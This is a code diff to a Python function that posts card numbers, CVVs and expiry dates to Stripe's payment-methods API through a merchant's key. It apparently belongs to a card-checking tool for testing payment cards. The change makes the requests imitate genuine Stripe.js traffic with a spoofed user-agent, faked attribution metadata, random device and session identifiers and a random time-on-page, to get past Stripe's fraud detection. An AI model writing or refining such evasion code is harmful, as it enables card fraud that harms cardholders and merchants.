@@ -327,29 +327,43 @@ async def auto_stripe_auth(
             result["message"] = "Setup intent nonce (_ajax_nonce / createSetupIntentNonce) not found"
             return result
 
-        # 3) POST api.stripe.com/v1/payment_methods
+        # 3) POST api.stripe.com/v1/payment_methods — must look like Stripe.js (avoid "integration surface is unsupported")
         stripe_headers = {
-            "authority": "api.stripe.com",
             "accept": "application/json",
-            "accept-language": "en-US,en;q=0.9",
             "content-type": "application/x-www-form-urlencoded",
             "origin": "https://js.stripe.com",
             "referer": "https://js.stripe.com/",
-            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
-            "sec-ch-ua-mobile": "?1",
-            "sec-ch-ua-platform": '"Android"',
-            "user-agent": ua,
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
         }
+        # Card number with spaces (how Stripe.js sends it)
+        card_formatted = " ".join([cc[i : i + 4] for i in range(0, len(cc), 4)])
         stripe_data = {
-            "billing_details[name]": "",
-            "billing_details[email]": email,
-            "billing_details[address][country]": "US",
             "type": "card",
-            "card[number]": cc,
+            "card[number]": card_formatted,
             "card[cvc]": cvv,
             "card[exp_year]": exp_year,
             "card[exp_month]": exp_month,
+            "allow_redisplay": "unspecified",
+            "billing_details[address][country]": "US",
+            "payment_user_agent": "stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent",
+            "referrer": base,
+            "time_on_page": str(random.randint(30000, 60000)),
+            "client_attribution_metadata[client_session_id]": "".join(
+                random.choices(string.ascii_lowercase + string.digits, k=36)
+            ),
+            "client_attribution_metadata[merchant_integration_source]": "elements",
+            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
+            "client_attribution_metadata[merchant_integration_version]": "2021",
+            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
+            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
+            "client_attribution_metadata[elements_session_config_id]": "".join(
+                random.choices(string.ascii_lowercase + string.digits, k=36)
+            ),
             "key": pks,
+            "_stripe_version": "2024-06-20",
+            "guid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
+            "muid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
+            "sid": "".join(random.choices(string.ascii_lowercase + string.digits, k=36)),
         }
         if acct:
             stripe_data["_stripe_account"] = acct
